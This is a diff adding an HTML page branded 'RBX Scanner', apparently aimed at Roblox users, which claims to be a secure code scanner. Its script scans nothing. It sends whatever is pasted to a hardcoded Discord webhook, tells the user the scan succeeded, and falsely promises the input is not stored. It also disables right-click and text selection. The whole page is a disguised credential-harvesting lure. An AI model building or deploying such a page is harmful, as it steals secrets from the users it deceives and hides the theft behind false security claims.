@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBX Scanner</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #1976d2;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .subtitle {
+            color: #64b5f6;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e3f2fd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #2196f3;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(33, 150, 243, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .status-message.show {
+            opacity: 1;
+        }
+
+        .status-message.success {
+            background: #e8f5e8;
+            color: #2e7d2e;
+            border: 1px solid #4caf50;
+        }
+
+        .status-message.error {
+            background: #ffeaea;
+            color: #d32f2f;
+            border: 1px solid #f44336;
+        }
+
+        .security-note {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #666;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">RBX Scanner</div>
+        <div class="subtitle">Secure Code Scanner</div>
+        
+        <form id="scannerForm">
+            <div class="input-group">
+                <input 
+                    type="text" 
+                    id="codeInput" 
+                    class="input-field" 
+                    placeholder="Paste your code here..."
+                    required
+                    autocomplete="off"
+                    spellcheck="false"
+                >
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Scan Code
+            </button>
+        </form>
+        
+        <div id="statusMessage" class="status-message"></div>
+        
+        <div class="security-note">
+            🔒 Your code is securely transmitted and not stored anywhere
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('scannerForm');
+        const codeInput = document.getElementById('codeInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message ${type} show`;
+            setTimeout(() => {
+                statusMessage.classList.remove('show');
+            }, 3000);
+        }
+
+        function getCurrentTimestamp() {
+            return new Date().toLocaleString();
+        }
+
+        async function sendToWebhook(code) {
+            try {
+                const payload = {
+                    embeds: [{
+                        title: "🔍 RBX Scanner - New Code Submission",
+                        description: `\`\`\`\n${code}\n\`\`\``,
+                        color: 0x2196F3,
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "RBX Scanner"
+                        },
+                        fields: [
+                            {
+                                name: "📅 Submitted At",
+                                value: getCurrentTimestamp(),
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Source",
+                                value: "RBX Scanner Website",
+                                inline: true
+                            }
+                        ]
+                    }]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    return { success: true };
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Webhook error:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const code = codeInput.value.trim();
+            
+            if (!code) {
+                showStatus('Please enter a code to scan', 'error');
+                return;
+            }
+
+            // Disable form during submission
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Scanning...';
+            
+            // Send to webhook
+            const result = await sendToWebhook(code);
+            
+            if (result.success) {
+                showStatus('✅ Code scanned successfully!', 'success');
+                codeInput.value = ''; // Clear the input for security
+            } else {
+                showStatus('❌ Failed to scan code. Please try again.', 'error');
+            }
+            
+            // Re-enable form
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Scan Code';
+        });
+
+        // Clear input on page load for security
+        window.addEventListener('load', () => {
+            codeInput.value = '';
+        });
+
+        // Prevent right-click context menu for added security
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+        });
+
+        // Disable text selection for security
+        document.addEventListener('selectstart', (e) => {
+            if (e.target !== codeInput) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
